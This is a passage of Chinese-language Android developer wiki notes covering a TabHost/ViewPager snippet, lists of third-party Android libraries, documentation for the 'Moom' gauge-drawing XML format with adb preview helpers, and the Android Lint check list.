			int position = mTabHost.getCurrentTab();
			mViewPager.setCurrentItem(position);
		}
		@Override
		public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {
		}
		@Override
		public void onPageSelected(int position) {
            // 当TabHost切换到当前Tab页时， 会自动将焦点夺取，如此ViewPager就无法响应手势了， 因此这里
            // 总是将焦点放在ViewPater上
			TabWidget widget = mTabHost.getTabWidget();
			int oldFocusability = widget.getDescendantFocusability();
			widget.setDescendantFocusability(ViewGroup.FOCUS_BLOCK_DESCENDANTS);
			mTabHost.setCurrentTab(position);
			widget.setDescendantFocusability(oldFocusability);
		}
		@Override
		public void onPageScrollStateChanged(int state) {
		}
	}
}
```
# 参考
 * 在线UI制作: http://android-ui-utils.googlecode.com/hg/asset-studio/dist/index.html
# Libs
[[TOC]]
# Android Third Part Libs
# 数据库
# !DroidCouch 
```
#!sh
$ git clone https://github.com/sig/DroidCouch.git
```
# GUI ==
# ObjectForms
 * http://www.objectforms.com/
# MrTips
MrTips is a 2-Class library that easily enbles you to display help in your Android app
 * https://github.com/lethargicpanda/mrtips.git
# 图形 
 * http://www.onbarcode.com/ 
# 消息
# Mobile Push (droidpush)
 * https://labs.ericsson.com/apis/mobile-java-push/
 
# 安全 
 * http://code.google.com/p/oauth-signpost/
# GreenGroid
 * http://android.cyrilmottier.com/?p=240
 * Blog: http://android.cyrilmottier.com/?p=240
# 多媒体 
 * Print Image: http://www.openintents.org/en/node/741
# 社交 
 * http://androidlibs.com/sociallib.html
# 其他
# XMLRCP
 * http://code.google.com/p/android-xmlrpc/
# 支付/广告
 * https://movend.com/
 * http://www.smaato.com/soma
# 蓝牙
 * http://www.sybase.com/products/allproductsa-z/mobiledevicesdks/bluetoothsdks
# 参考 ==
 * http://www.openintents.org/en/libraries
 * http://www.openintents.org/en/
# AndroidLibs =
 * http://www.androidviews.net/
 * [https://github.com/languages/Java/most_watched github top java project]
 * http://blog.tisa7.com/tech/android_develop_resources.html
# UI控件
# Android sliding menu
 * https://github.com/jfeinstein10/SlidingMenu
# 存储
 * [http://greendao-orm.com/blog/ GreenDao]
# Root工具
 * https://code.google.com/p/roottools/
# 
组件篇：
 * https://github.com/emilsjolander/StickyListHeaders 
 * [https://github.com/openaphid/android-flip Android-Flip]：可以实现类似FlipBoard那种华丽丽的翻页
 * [https://github.com/bauerca/drag-sort-listview Drag-Sort-Listview] ：可以拖动item重新排序的listview，效果非常赞
 * [https://github.com/Prototik/HoloEverywhere HoloEveryWhere]：咳咳，有些同学非常喜欢Android的holo风格，这个项目绝对让你happy
 * [https://github.com/tisa007/Android-Universal-Image-Loader Universal-ImageLoader]：这个经典的异步图片加载，不多说了
 * [https://github.com/jfeinstein10/JazzyViewPager JazzyViewPager]：这玩意可以让ViewPager翻起来更酷，谁用谁知道~~
 * [https://github.com/jfeinstein10/SlidingMenu SlidingMenu]：这个是抽屉界面（就是facebook那种）的各种实现版本中，最好的，木有之一！
 * [https://github.com/emilsjolander/StickyListHeaders StickyListHeaders]：iPhone上经常有这个，就是listview的……不知道怎么解释，自己下载看看吧
 * [Android-PullToRefresh https://github.com/chrisbanes/Android-PullToRefresh]：下拉刷新，挺常用的一个组件
 * [StaggeredGridView https://github.com/maurycyw/StaggeredGridView]：这是一个瀑布流布局的实现，还不是很完善，但作为学习的案例或者在其基础上扩展还是不错的
 * [android-async-http https://github.com/loopj/android-async-http]：android的异步请求组件，我个人习惯使用asynctask，不过这个实现还是很优秀的，也推荐给大家
 * [ActionBarSherlock]：大家熟知的ActionBar在2.x上的兼容性方案；类似的兼容性组件还有许多，有时间为大家一一列出；
 * [facebook-android-sdk https://github.com/facebook/facebook-android-sdk/]：不止是一个SDK那么简单哦，比某浪和某人的SDK强几个数量级；
 * [NineOldAndroids https://github.com/JakeWharton/NineOldAndroids]：想在2.xSDK上使用Android 3.0新增的动画API，那就是它了；没用过的同学一定要试试哦，非常方便~
 * [android-swipelistview https://github.com/47deg/android-swipelistview]：让listview的item可以向右滑动，新版Gmail和Pocket里面有用到哦~
 * [DataDroid https://github.com/foxykeep/DataDroid]：Android的RESTful封装，没听过RESTful？你去死吧
 * [EventBus https://github.com/greenrobot/EventBus]：和上面的DataDroid同样属于美化底层代码的，这个lib简化了不同组件之间的事件传递
 * [android-switch-backport https://github.com/BoD/android-switch-backport]：Android3.0以上才有的switch，有好心人给迁移到2.x上了，哈
 * [PagerSlidingTabStrip https://github.com/astuetz/PagerSlidingTabStrip]：最新版的GooglePlay的那个tab效果，可炫可炫了
 * [chromeview]：我们都知道webvie
# Google Gson
```
$ svn checkout http://google-gson.googlecode.com/svn/trunk/ google-gson-read-only
```
# ImageLoader
 * https://github.com/novoda/ImageLoader
# 
 * http://www.openintents.org/en/libraries
Title	 Description
AdWhirl	
AdWhirl is a free, open source tool that helps you make more money from your iPhone or Android app. It enables you to serve ads in your app from any number of ad networks as well as your own house ads. By using multiple networks, you can determine which perform best for you and optimize accordingly to maximize your revenue and fill all your inventory.
www.adwhirl.com
AGE	
AGE is an open source, LGPL game engine for the Android platform that will push to streamline and standardize Android development for games with a focus on performance, size, and modular design.
http://code.google.com/p/age/
aiCharts (commercial)	
Android Chart Engine, requires developer license.
http://www.artfulbits.com/Android/aiCharts.aspx
Allyjoyn - P2P SDK	
Qualcomm's solution for P2P communication across platforms including Android:
http://developer.qualcomm.com/dev/alljoyn-p2p
Android Chart (commercial)	
Library with Chart API, requires developer license.
http://www.keepedge.com/products/android_charting/
Android Chart Library - kiChart	
kiChart is a chart solutions on android platform, you can use it to create your android chart applications. It’s easy to use, effectively and powerfully. It will save your valuable time in developing.
http://www.kidroid.com/kichart/
Android RSS Library	
android-rss is a lightweight open-source (Apache 2.0) library to read parts of RSS 2.0 feeds. The library uses (Level 1) APIs such as android.net.Uri. The design features stream parsing with SAX. As a result, the memory footprint tends to be smaller compared to an equivalent DOM-based solution.
https://github.com/ahorn/android-rss
android-json-rpc	
This open source library aims to help the implementation of JSON-RPC clients in android applications. The library provides a simple API to perform JSON-RPC calls from an android device.
Project page on google code :
http://code.google.com/p/android-json-rpc/
AndroidDataFramework	
Library to create and manage databases through xml resources.
Read more at http://www.brighthub.com/mobile/google-android/articles/52883.aspx
http://code.google.com/p/androiddataframework/downloads/list
Angle	
Angle is aimed to be a way to develop 2D games using OpenGL ES on Android providing as much speed as possible. The engine is entirely coded in java so you can overload every object for your convenience.
http://code.google.com/p/angle/
aSmack (XMMP)	
Smack library (XMPP) with heavy patches for Android.
http://code.google.com/p/asmack/
Barcode scanner SDK by Biggu (adware)	
Barcode scanner SDK made for fixed focus cameras as well as autofocus. Made by Big in Japan (ShopSavvy)
http://www.freebarcodescanner.com/
Bluetooth (<2.0)	
Bluetooth library for devices with Android < 2.0
http://code.google.com/p/android-bluetooth/
Calculon	
Calculon is a testing DSL for Google Android. It allows you to write functional story based tests.
http://github.com/kaeppler/calculon/
cloak	
Open source 2D game framework for Android
http://code.google.com/p/cloak/
Cocos2D	
2D game engine base on cocos2d-iphone.
http://code.google.com/p/cocos2d-android/
Commonsware Library	
Great collection of reusable code for various objectives.
http://github.com/commonsguy/cw-android
ContactsLib	
A library for developers, wishing to work easily with Contacts,without knowing how a Content Provider operates.
http://androidlibs.com/contactslib.html
Deacon - A Push Notifications / C2DM library for Android and Java applications	
Deacon is a free and open-source Java push notifications library for Android and Java applications. It acts as a client to the Meteor COMET web server. Deacon was created with the goal to bring a solid push notification platform to Android, and to enable developers to push-enable their apps without being dependent on anyone else's servers.
Deacon Project Blog
Deacon's source code repository at GitHub
Deacon Project mailing list
Video: Push-enabling your app with Deacon (4 minutes)
droid-fu	
Droid-Fu is an open-source effort aiming to collect and bundle solutions to common concerns in the development of applications.
Droid-Fu offers both support classes meant to be used alongside existing Android code, as well as self-contained, ready-to-be-used components like new adapters and widgets.
http://github.com/kaeppler/droid-fu
Droid-fu	
Droid-Fu offers both support classes meant to be used alongside existing Android code, as well as self-contained, ready-to-be-used components like new adapters and widgets.
The areas tackled by Droid-Fu include:
- application life-cycle helpers
- support classes for handling Intents and diagnostics
- better support for background tasks
- super-easy and robust HTTP messaging
- (remote) image handling and caching
- custom adapters and views
Droid fu repository
Droidcouch	
Library to access a CouchDB server
http://github.com/sig/DroidCouch
DrupalCloud	
Library to communicate with Drupal services.
http://github.com/skyred/DrupalCloud
Exit Games SDK	
Client SDK for real-time games framework by Exit Games
http://www.exitgames.com/Download/Photon
eyes-free	
The TTS library for Android (Text-To-Speach)
http://code.google.com/p/eyes-free/
Facebook Connect	
Library with activities to connect with Facebook
http://code.google.com/p/fbconnect-android/
Flurry	
Flurry is a leading smartphone application analytics and monetization platform used by more than 30,000 applications across iOS, Android, Blackberry and J2ME. Each month, Flurry tracks over three billion end user application sessions per month.
Flurry Analytics helps developers make better applications, increase retention and grow revenue. Flurry AppCircle is an intelligent, analytics-powered cross-selling network that accelerates user acquisition for promoters and meaningfully monetizes applications for publishers.
www.flurry.com
GraphWidget (commercial)	
Android library for visualizing real-time input data with horizontal scroll
http://graphwidget.android-libraries.com/
GreenDroid Library	
This library is just here to help the Android application development. It have those objectives :
- Prevent loosing time at copying the same snippets of code over and over again.
- Try to make Android applications alike.
- Help developers to code highly functional applications.
- Leverage the power of the Android framework.
- Use as much XML as possible.
For more information :
http://android.cyrilmottier.com/?p=240
iPrint (commercial)	
Library to add printing functionality to apps. Network printer, Wifi printer, Bluetooth printer.
http://www.iprintsdk.com/
Jackson	
JSON marshaller/unmarshaller for Java that runs on Android
http://fisheye.codehaus.org/browse/jackson/
jMonkey Engine (JME3D, JME2D)	
Leading java based 3D game engine that also supports Android.
http://code.google.com/p/jmonkeyengine/
juicygames	
A video game framework for rapid game prototyping, partly modeled after Britt Hannah's article Object-Oriented Game Design.
http://code.google.com/p/juicygames/
libgdx	
GDX is a simple Android game development framework that allows rapid prototyping on your desktop PC/Mac guaranteeing the same behaviour on your Android devices.
http://code.google.com/p/libgdx/
mAppWidget (commercial)	
Add fully functional custom offline maps to your Android apps in minutes
http://mapp.android-libraries.com
metagloss	
metagloss is an annotation-centric Android library for reducing boilerplate code. Relying on run-time parsing and compile-time code generation, metagloss provides facilities for mapping XML and databases to data objects, dealing with preference screens and working with DB queries.
SF Project page: http://sourceforge.net/projects/metagloss
Documentation: http://metagloss.sf.net
Mobile Maps	
Mobile Maps provides developers with a simple way of adding map functionality to your mobile phone applications. It also includes access to the map data itself, from either TeleAtlas or OpenStreetMap depending on which data suits your application needs.
https://labs.ericsson.com/apis/mobile-maps/
Mobile Push (droidpush)	
The Mobile Push API enables you to push content directly to one or more phones. SMS and HTTP technology are used for delivery, making it suitable for applications where it is important to ensure that the latest information always is available at the receiving end, without the need to frequently poll for updates.
https://labs.ericsson.com/apis/mobile-java-push/
MoVend	
MoVend is an in-app commerce platform which allows users to make payment within an application. Developers can integrate MoVend into their applications and start monetizing. This solution is provided for developers, publishers and operators who want to have a payment system inside their application, without the hassle of creating one. MoVend works as a payment aggregator, connecting the developers and their users. SDK is free for download once you signed up for a developer account at https://movend.com
OAuth	
An OAuth Library/application for Android which uses Content Providers in order to store OAuth data
http://github.com/novoda/oauth_for_android
Note, that you can also use SignPost for Android when just making OAuth calls (see http://github.com/kaeppler/signpost)
ObjectForms	
Create Android GUI in more efficient way.
ObjectForms leverage Java class introspection to build user interface for your live objects, eliminating the need to write glue code. Relying on Java and Object Oriented principles means UI code can be reused and extended even if it grows complex, which is difficult if you do your layouts in XML.
http://www.objectforms.com
Open NFC API	
Open NFC is an open source stack implementing the NFC functionnalities, it consists of documentation and SDK add-on to enable RFID communication on Android.
http://sourceforge.net/projects/open-nfc/
open-social-java-client	
The OpenSocial Java Client Library enables you to work with OpenSocial data on your server, in the language of your choice. Includes description for android.
http://code.google.com/p/opensocial-java-client/
OpenCore	
PV provides software to deliver media services people will love. PV's software gives users greater access and control over their media experience, increasing the value of your services and helping you differentiate your brand.
A rich application framework for networked media applications and helps you:
Accelerate time to market
Reduce operational costs and resources
Improve the user experience
Brand your applications with a consistent look and feel
http://www.opencore.net/
OpenCV-Android	
Android version of the computer vision library OpenCV.
http://billmccord.github.com/OpenCV-Android/
Print Image	
Action: org.androidprinting.intent.action.PRINT
Input:
URI of the image to be printed, mime type of the image (must be of type "image/*")
Any application can use HP iPrint Photo for Android for printing images on nearby printers from Android phones.
HP iPrint Photo for Android phones: http://www.hp.com/global/us/en/consumer/digital_photography/free/softwar...
Wireless photo printing from your mobile device
Qualcomm Tools	
Qualcomm has published some librairies that could be really interesting :
Looking to optimize your app’s performance? Want to expand your development capabilities? We’ve built these tools for developers who want more out of our chips, so use them to take your app to the next level. And we have more on the way, so watch this space.
ALLJOYN P2P TOOLS
AllJoyn SDK
AllJoyn technology allows developers to create viral and social apps with connectivity across devices via ad hoc, peer networks.
ADRENO GRAPHICS OPTIMIZATION TOOLS
Ikivo IDE & Animator
The IKIVO IDE provides a complete tooling solution for developing, debugging and testing mobile applications based on the open standard Mobile SVG and JavaScript. Use the IKIVO Animator create animations, user interfaces, multimedia messages, and much more.
Adreno™ SDK
Download this first! The Adreno SDK is the first thing you’ll need when working with OpenGL ES. OpenGL ES desktop emulation libraries, sample code, tutorials, demos, documentation, and miscellaneous tools.
Adreno™ Profiler
Provides optimization, per-frame analysis and real-time performance counter visualization.
AUGMENTED REALITY TOOLS
AR SDK
The Qualcomm Augmented Reality Platform provides developers the ability to create high-performance Android applications with C++ APIs.
You can find all those librairies here :
http://developer.qualcomm.com/dev/android/tools
RESTProvider	
RESTProvider handles all the HTTP querying and caching. Users can seamlessly interface with any Web Service API which provides JSON or XML as a response. To query a RESTProvider in an activity a user need only specify an endpoint and then query an APIs RESTful functions.
http://github.com/novoda/RESTProvider
Rokon	
Rokon is an open source OpenGL 2D game engine for Android mobile devices.
http://code.google.com/p/rokon/
SignPost	
Simple, unobstrusive, modular library to sign http requests with OAuth tokens.
http://code.google.com/p/oauth-signpost/
SocialLib	
SocialLib aims to make the development of Social apps much more easier. Currently, Social Lib provides access to the following social networks : Facebook, Twitter, Google Buzz, LinkedIn.
http://androidlibs.com/sociallib.html
SOMA	
Library to include advertisement delivered by Smaato.
See http://www.smaato.com/soma
Spring Android	
Spring Android is an extension of the Spring Framework that aims to simplify the development of native Android applications.
Contains a Rest Client, a Commons Logging adapter
http://www.springsource.org/spring-android
Sybase Bluetooth SDK (commercial)	
Bluetooth SDK by Sybase for proven Bluetooth connection and quality
http://www.sybase.com/products/allproductsa-z/mobiledevicesdks/bluetooth...
TeeChart Charting	
Charting library for Android, provides a CHART Intent to return a picture of your custom data.
http://www.steema.com
https://market.android.com/details?id=com.steema.teechart.android
final Intent intent = new Intent("com.steema.teechart.android.CHART");
intent.setType("text/*");
intent.putExtra("Header", "Hello World !");
intent.putExtra("Style", "Bar");
intent.putExtra("Text", new String[] { "Apples", "Bananas", "Kiwis" });
intent.putExtra("Values", new double[] { 45, 23, 12 });
public void onActivityResult(int requestcode, int resultcode, Intent intent) {
if (resultcode == RESULT_OK)
final Bitmap bitmap = ChartIntent.getChart(requestcode, intent);
}
TeeChart provides complete, quick and easy to use charting .NET, Java, ActiveX / COM, PHP and Delphi VCL controls for business, Real-time, Financial and Scientific applications.
Full source code available, visit us at www.steema.com
TeeChart for Java v.2 Charting component Library ships with 100% sourcecode in Android, AWT/Swing and SWT formats. It supports major Java programming environments including IBM Eclipse, Sun NetBeans, IntelliJ IDEA and Oracle JDeveloper.
The charting library offers 50 Java Chart styles (in 2D and 3D plus multiple combinations), 38 mathematical functions and 20 Chart tools components for additional functionality including dragging of series marks, annotation objects, cursors and manual trend lines, coloring bands, etc.
Charting styles:
Line (Tape), Points (Scatter XY and XYZ 3D Scatter), Area (Stacked and negative), FastLine (real-time speed), Horizontal Line, Bar and Horizontal Bar (Stacked and negative), Pie (Exploded, partial angle), Shape (Cube, Pyramid, Cylinder, etc), Arrow (Callout), Bubble, Gantt, Candle (Finantial OHLC High-Low), Donut (Exploded Doughnut), Volume (Stock), Bar 3D, Points 3D, Polar, Radar, Clock, WindRose, Pyramid, Surface (XYZ Grid Mesh), LinePoint, BarJoin.class, ColorGrid, Waterfall, Histogram, Error, ErrorBar, Contour (Contouring Levels), Smith, Calendar, HighLow, TriSurface (Voronoi triangulation of arbitrary XYZ points), Funnel, Box (Box Whisker), Horizontal Box,	 Horizontal Area, Tower, Point and Figure, Gauges, Vector 3D, Map (Mapping GIS), Bezier, Bar with Image, IsoSurface (Auto Leveled XYZ Mesh), Circular Gauge, Linear Gauge, Vertical Linear Gauge, Horizontal Histogram.
Feature Summary:
50 Chart styles (in 2D and 3D plus multiple combinations) including Gauges
38 mathematical functions
100% sourcecode for Android, AWT/Swing and SWT
Run-time Editor, Gallery dialogs
20 Chart Tool components for additional functionality, like dragging series marks, annotation objects, cursors and manual trend lines, coloring bands, etc
Chart Grid component to manage data
Multiple-axis support both horizontal and vertical
Customisation of axis labels and legend items
Great cosmetic properties for all texts and drawings
Complete set of chart styles, both in 2D and 3D
Live and animated zoom and scroll. Multi-touch and mouse wheel supported
2D and 3D
Custom drawing canvas
Extensive demos
Design and runtime integrated Chart and Series editor
New improved Javadoc format help plus Tutorials
Many new visual features, transparency, colour gradients, gray-scale.
Mathematical and statistical functions:
Add, Subtract, Multiply, Divide, High, Low, Average, Count,
Momentum, Momentum Division, Cumulative, Exponential Average, Smoothing, Custom User Defined, Root Mean Square,
Standard Deviation (StdDeviation), Stochastic, Exponential Moving Average, Performance, CrossPoints, Compress OHLC,
CLV, OBV, CCI, Moving Average, PVO, DownSampling, Trend, Correlation, Variance, Perimeter, CurveFitting,
ADX, Bollinger, MACD, SAR, RSI, Histogram Function.
Tips Library	
Small library to quickly add tips and tricks to your app
http://lethargicpanda.tumblr.com/post/1149443255/introducing-mrtips-android-library
Twitter	
Library with activities to connect with Twitter and Demo Twitter Project
https://github.com/brione/Brion-Learns-OAuth
ViewFlow	
ViewFlow is an Android UI widget providing a horizontally scrollable ViewGroup with items populated from an Adapter.
https://github.com/pakerfeldt/android-viewflow
XMLRCP	
A very thin yet complete xmlrpc client side library for Android platform.
http://code.google.com/p/android-xmlrpc/
Xtify (commercial) - Push notification service	
Allows to include location based push notification into applications. Notificatzions are managed through the backend at xtify.com
See http://developer.xtify.com
ZXing	
ZXing is an open-source, multi-format 1D/2D barcode image processing library implemented in Java. Our focus is on using the built-in camera on mobile phones to photograph and decode barcodes on the device, without communicating with a server.
Note also the project at http://www.onbarcode.com/products/android_barcode/
http://code.google.com/p/zxing/
# 游戏引擎
# AndEngine
 * https://market.android.com/details?id=org.anddev.andengine.examples 
 * http://blog.csdn.net/cping1982/article/details/6227775
 * http://kivy.org/
# 列表动画
 * https://github.com/twotoasters/JazzyListView.git
[[TOC]]
# Moom
Moom是一个用于绘制仪表的专用库.
# 绘图指令
# moom
||= 属性名   =||= 取值 =||= 说明 =||
|| size      || widthxheight ||
|| tag       ||              ||
|| clockwise || true/false   || 采用顺时针或逆时针方向绘制子图， 若子图指定了clockwise属性，则使用子图的该属性 ||
|| bg        || @drawable/bg || 用于设置Moom的背景
|| bg-margin || 0-1f || 必须在bg后使用, 用于设定背景绘制距画布的外边距，[[BR]]如: 若100x100画布大小， bg-margin="0.2"时， 则实际绘制背景的区域为(0.2*100,0,2*100 -- 100-100*0.2, 100-100*0.2) ||
# arc-scale
||= 属性名 =||= 取值 =||= 说明 =||
|| drawRect    || || "10,10,390,390" ||
|| margin      ||
|| startAngle  ||
|| sweepAngle  ||
|| scaleLength ||
|| mainScaleLineOffset ||
|| scaleTextPadding ||
|| scaleInterval ||
|| scaleTextColor ||
|| scaleWidth ||
|| scaleTextSize || || "assets:///r2014.ttf" ||
|| color ||
|| maxScale ||
# text-board
||= 属性名 =||= 取值 =||= 说明 =||
|| drawRect ||
|| expr     ||
|| textSize ||
|| alpha    ||
|| static   ||
|| align    ||
|| color    ||
# arc-scale
# image
||= 属性名 =||= 取值 =||= 说明 =||
|| zoom
# hand
||= 属性名 =||= 取值 =||= 说明 =||
|| drawRect
|| expr
|| startAngle
|| sweepAngle
|| scaled
|| static
|| src
|| alpha
|| zoom 
# text-board
||= 属性名 =||= 取值 =||= 说明 =||
|| drawRect
|| expr
|| textSize
|| alpha
|| static
|| align
|| color
# map
例如:
```xml
<?xml version="1.0" encoding="utf-8"?>
<moom
	tag=":power"
	name="默认的电池仪表">
    <!-- 如果:power.status的值为charging时，则绘制image-->
	<map
		key=":power.status">
		<image
			tag="charging"
			margin="10"
			src="@drawable/charging" />
	</map>
</moom>
```
# 使用include
Moom配置文件支持引用另外的一个配置文件.
```graphviz
digraph G{
   node[shape=record];
   "配置文件A" -> "配置文件B"[label="<moom include="配置文件B">..</moom>"]
}
```
示例:
```CodeExample
#!xml
## title="xml/moom_base.xml"
<?xml version="1.0" encoding="utf-8"?>
<moom
	size="200x200">
	<text-board
		id=":tb0"
		drawRect="%,0.2,0,1,0.4"
		textSize="30"
		align="center" />
	<text-board
		id=":tb1"
		drawRect="%,0,0,1,0.8"
		static="false"
		textSize="60"
		align="center" />
	<text-board
		id=":tb2"
		drawRect="%,0,0.4,1.2,1"
		static="false"
		textSize="30"
		align="center" />
</moom>
```
```CodeExample
#!xml
## title="xml/moom_x.xml"
<?xml version="1.0" encoding="utf-8"?>
<moom
    include="moom_base_5"
    size="200x200"
    tag=":cpu"
	name="纯文字版">
    <text-board
	text="@string/widget_cpu"
        align="center"
        color="#32CD32" 
        alpha="200"/>
	
    <text-board
        expr="(format :cpu.usage.total %)"
        font="assets:///led.ttf"
        color="green" 
        alpha="255"/>
    
    <text-board
	expr="(format :cpu.cur.freq.formatted Hz)"
        font="assets:///led.ttf"
        color="green" 
        text="300MHz"/>
</moom>
```
# Moom配置文件的组织原则
 1. 静态布局部分放到BaseMoom配置文件中
 2. 动态部分放到专门的配置文件中,
 3. 静态布局文件不被直接加载
id命名规则
|| :tbN
|| :hN
|| :ac
# 宏
内存:
||%MEM_PERCENT  || (percent :memory.used.percent)
||%MEM_USED     || (format :memory.used.percent %)
||%MEM_TOTAL    || (formatb :memory.TOTAL) 
电池:
||%POW_LP || (percent :power.level) 
||%POW_LT || (format :power.level %)
||%POW_VT || (format :power.voltage.v V)
||%POW_TT || (format :power.temperature ℃)
		
CPU:
||%CPU_UP  || (percent :cpu.usage.total)
||%CPU_UPT || (format :cpu.usage.total %)
||%CPU_FC  || (format :cpu.cur.freq.formatted Hz)
||%CPU_CN  || (format :cpu.count)		
||%CPU0_UP || (percent :cpu.usage.cpu0)
||%CPU1_UP || (percent :cpu.usage.cpu1)
||%CPU2_UP || (percent :cpu.usage.cpu2)
||%CPU3_UP || (percent :cpu.usage.cpu3)
存储:
||%DISK_UP  ||  (percent :space.used.percent)
||%DISK_UPT || (format :space.used.percent %)
||%DISK_UUT || (formatb :space.used)
||%DISK_UTT || (formatb :space)
# 优化记录
||= 对象 =||= 个数 =||= 占用内存=||
|| Paint     || 466 || 24976B ||
|| TextPaint || 270 || 19440B ||
|| Typeface  || 38  || 600B   ||
# 工具
BonnyBox支持预览Moom配置,在预览的配置里目前还不能include内置配置文件以外的内容， 也不能使用包外的图片资源，包括: 指针，表盘等等.
# 安装
将以下内容拷贝到shell本地配置文件中(比如: ~/.zshrc或~/.alias, 如果使用bash则是: ~/.bashrc)
```sh
export DEVICE_SDCARD_DIR="/mnt/sdcard"
bbox.preview() {
    local uri=$1
    adb shell am start -n lab.whitetree.bonny.box/.ui.Hell -d "$uri" --activity-clear-top
}
bbox.preview.file() {
    local file="$1"
    local file_name=$(basename $file)
    adb push $file ${DEVICE_SDCARD_DIR} && bbox.preview "file//${DEVICE_SDCARD_DIR}/$file_name"
}
```
使用方法:
```sh
# 预览包内的Moom
$ bbox.preview res:///moom_cpu_total_usage
# 预览本地配置
# 注意: 本地文件将被上传到手机的${DEVICE_SDCARD_DIR}目录下，可以根据设备不同修改`DEVICE_SDCARD_DIR`环境变量即可.
$ bbox.preview.file x.xml
```
|| 
[[TOC]]
# Lint 
 * http://tools.android.com/tips/lint
# 如何使用
```sh
$ cd <anaroid-project>
# 检出无用资源
$ lint --check UnusedResources
```
# 检查项目
```
Valid issue categories:
    Correctness
    Correctness:Messages
    Security
    Performance
    Usability:Typography
    Usability:Icons
    Usability
    Accessibility
    Internationalization
Valid issue id's:
"ContentDescription": Ensures that image widgets provide a contentDescription
"LabelFor": Ensures that text fields are marked with a labelFor attribute
"FloatMath": Suggests replacing android.util.FloatMath calls with
      java.lang.Math
"FieldGetter": Suggests replacing uses of getters with direct field access
      within a class
"SdCardPath": Looks for hardcoded references to /sdcard
"NewApi": Finds API accesses to APIs that are not supported in all targeted
      API versions
"InlinedApi": Finds inlined fields that may or may not work on older
      platforms
"Override": Finds method declarations that will accidentally override methods
      in later versions
"InvalidPackage": Finds API accesses to APIs that are not supported in
      Android
"DuplicateIncludedIds": Checks for duplicate ids across layouts that are
      combined with include tags
"DuplicateIds": Checks for duplicate ids within a single layout
"DuplicateDefinition": Discovers duplicate definitions of resources
"UnknownId": Checks for id references in RelativeLayouts that are not defined
      elsewhere
"UnknownIdInLayout": Makes sure that @+id references refer to views in the
      same layout
"StateListReachable": Looks for unreachable states in a <selector>
"StyleCycle": Looks for cycles in style definitions
"InefficientWeight": Looks for inefficient weight declarations in
      LinearLayouts
"NestedWeights": Looks for nested layout weights, which are costly
"DisableBaselineAlignment": Looks for LinearLayouts which should set
      android:baselineAligned=false
"Suspicious0dp": Looks for 0dp as the width in a vertical LinearLayout or as
      the height in a horizontal
"Orientation": Checks that LinearLayouts with multiple children set the
      orientation
"ScrollViewSize": Checks that ScrollViews use wrap_content in scrolling
      dimension
"Deprecated": Looks for usages of deprecated layouts, attributes, and so on.
"ObsoleteLayoutParam": Looks for layout params that are not valid for the
      given parent layout
"MergeRootFrame": Checks whether a root <FrameLayout> can be replaced with a
      <merge> tag
"NestedScrolling": Checks whether a scrolling widget has any nested scrolling
      widgets within
"ScrollViewCount": Checks that ScrollViews have exactly one child widget
"AdapterViewChildren": Checks that AdapterViews do not define their children
      in XML
"UseCompoundDrawables": Checks whether the current node can be replaced by a
      TextView using compound drawables.
"UselessParent": Checks whether a parent layout can be removed.
"UselessLeaf": Checks whether a leaf layout can be removed.
"TooManyViews": Checks whether a layout has too many views
"TooDeepLayout": Checks whether a layout hierarchy is too deep
"GridLayout": Checks for potential GridLayout errors like declaring rows and
      columns outside the declared grid dimensions
"DalvikOverride": Looks for methods treated as overrides by Dalvik
"OnClick": Ensures that onClick attribute values refer to real methods
"ViewTag": Finds potential leaks when using View.setTag
"DefaultLocale": Finds calls to locale-ambiguous String manipulation methods
"SimpleDateFormat": Using SimpleDateFormat directly without an explicit
      locale
"Registered": Ensures that Activities, Services and Content Providers are
      registered in the manifest
"MissingRegistered": Ensures that classes referenced in the manifest are
      present in the project or libraries
"Instantiatable": Ensures that classes registered in the manifest file are
      instantiatable
"InnerclassSeparator": Ensures that inner classes are referenced using '$'
      instead of '.' in class names
"MissingId": Ensures that XML tags like <fragment> specify an id or tag
      attribute
"WrongCase": Ensures that the correct case is used for special layout tags
      such as <fragment>
"HandlerLeak": Ensures that Handler classes do not hold on to a reference to
      an outer class
"ValidFragment": Ensures that Fragment subclasses can be instantiated
"ExtraTranslation": Checks for translations that appear to be unused (no
      default language string)
"MissingTranslation": Checks for incomplete translations where not all strings
      are translated
"HardcodedText": Looks for hardcoded text attributes which should be converted
      to resource lookup
"EnforceUTF8": Checks that all XML resource files are using UTF-8 as the file
      encoding
"MangledCRLF": Checks that files with DOS line endings are consistent
"EasterEgg": Looks for hidden easter eggs
"StopShip": Looks for comment markers of the form "STOPSHIP" which indicates
      that code should not be released yet
"Proguard": Looks for problems in proguard config files
"ProguardSplit": Checks for old proguard.cfg files that contain generic
      Android rules
"PxUsage": Looks for use of the "px" dimension
"SpUsage": Looks for uses of "dp" instead of "sp" dimensions for text sizes
"InOrMmUsage": Looks for use of the "mm" or "in" dimensions
"SmallSp": Looks for text sizes that are too small
"TextFields": Looks for text fields missing inputType or hint settings
"TextViewEdits": Looks for TextViews being used for input
"SelectableText": Looks for TextViews which should probably allow their text
      to be selected
"UnusedResources": Looks for unused resources
"UnusedIds": Looks for unused id's
"ExtraText": Looks for extraneous text in layout files
"PrivateResource": Looks for references to private resources
"InconsistentArrays": Checks for inconsistencies in the number of elements in
      arrays
"HardcodedDebugMode": Checks for hardcoded values of android:debuggable in the
      manifest
"ManifestOrder": Checks for manifest problems like <uses-sdk> after the
      <application> tag
"UsesMinSdkAttributes": Checks that the minimum SDK and target SDK attributes
      are defined
"MultipleUsesSdk": Checks that the <uses-sdk> element appears at most once
"WrongManifestParent": Checks that various manifest elements are declared in
      the right place
"DuplicateActivity": Checks that an activity is registered only once in the
      manifest
"OldTargetApi": Checks that the manifest specifies a targetSdkVersion that is
      recent
"AllowBackup": Ensure that allowBackup is explicitly set in the application's
      manifest
"UniquePermission": Checks that permission names are unique
"MissingVersion": Checks that the application name and version are set
"IllegalResourceRef": Checks for resource references where only literals are
      allowed
"ExportedContentProvider": Checks for exported content providers that do not
      require permissions
"ExportedService": Checks for exported services that do not require
      permissions
"ExportedReceiver": Checks for exported receivers that do not require
      permissions
"GrantAllUris": Checks for <grant-uri-permission> elements where everything is
      shared
"WorldReadableFiles": Checks for openFileOutput() and getSharedPreferences()
      calls passing MODE_WORLD_READABLE
"WorldWriteableFiles": Checks for openFileOutput() and getSharedPreferences()
      calls passing MODE_WORLD_WRITEABLE
"SecureRandom": Looks for suspicious usage of the SecureRandom class
"GifUsage": Checks for images using the GIF file format which is discouraged
"IconDensities": Ensures that icons provide custom versions for all supported
      densities
"IconMissingDensityFolder": Ensures that all the density folders are present
"IconDipSize": Ensures that icons across densities provide roughly the same
      density-independent size
